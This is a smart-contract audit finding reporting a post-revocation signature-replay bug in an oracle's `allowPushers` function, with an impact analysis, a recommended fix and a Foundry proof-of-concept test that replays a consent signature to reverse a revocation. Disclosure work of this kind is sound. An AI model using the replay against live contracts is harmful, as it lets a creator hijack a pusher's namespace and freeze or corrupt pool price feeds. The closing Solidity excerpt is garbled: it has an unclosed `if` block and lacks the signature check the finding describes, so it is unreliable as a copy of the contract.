### Title
Post-Revocation Signature Replay in `allowPushers` Breaks Revocation Finality — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`revokePusher()` clears `namespaceRemapping[pusher]` but does not invalidate the pusher's previously signed EIP-191 consent. A creator can immediately call `allowPushers` again with the same signature and the same (still-valid) deadline to silently re-establish `namespaceRemapping[pusher] = creator`, defeating the pusher's revocation.

### Finding Description
`allowPushers` verifies:
1. `block.timestamp <= deadline` — only checks expiry, not revocation state
2. `pusher == ECDSA.recover(hash, sig)` — the signature is still cryptographically valid after revocation

There is no per-pusher nonce, no used-signature set, and no revocation timestamp. After `revokePusher()` sets `namespaceRemapping[pusher] = address(0)`, the creator can call `allowPushers(deadline, [pusher], [originalSig])` with the original signature (deadline still in the future) and the mapping is restored to `creator`. The pusher has no on-chain way to prevent this short of waiting for the deadline to expire.

The fallback push path resolves the namespace at call time from `namespaceRemapping[msg.sender]`, so a re-delegated pusher's subsequent pushes land in the creator's namespace, not their own.

### Impact Explanation
A pusher who revokes to redirect their pushes into their own namespace (e.g., to feed a pool registered against `feedIdOf(pusher, slotIndex, positionIndex)`) will find their pushes silently redirected back to the creator's namespace. The pusher's own namespace stays at price 0 / timestamp 0. Any pool consuming `feedIdOf(pusher, ...)` receives stale data, which every consumer rejects as stale — effectively freezing the pool's oracle and blocking swaps or causing bad-price execution if a fallback path is used.

### Likelihood Explanation
The attack requires only that the creator retain the original signature (which they already submitted on-chain in the first `allowPushers` call, so it is publicly visible in calldata) and that the deadline has not yet expired. No privileged role is needed. The creator is a regular user, not a trusted oracle admin.

### Recommendation
Track revocation per pusher with a monotonic nonce or a per-pusher revocation timestamp. The simplest fix: store `revokedAt[pusher] = block.timestamp` in `revokePusher()` and require in `allowPushers` that the signature's deadline was issued after `revokedAt[pusher]` (i.e., the consent must post-date the revocation). Alternatively, increment a per-pusher nonce on every revocation and include the nonce in the signed message.

### Proof of Concept
```solidity
// 1. Pusher signs consent with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator delegates pusher
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator);

// 3. Pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0));

// 4. Creator replays the SAME signature — deadline still valid
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig)); // succeeds, no revert

// 5. Revocation is undone
assertEq(oracle.namespaceRemapping(pusher), creator); // PASSES — invariant broken

// 6. Pusher pushes thinking they're in own namespace; data lands in creator's namespace
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(1, 0, _packRaw(999_000, 1, 1), uint56(block.timestamp * 1000)));
assertTrue(ok);
// pusher's own namespace is empty:
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 1, 0)).price, 0);
// creator's namespace has the data:
assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 1, 0)).price, 0);
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
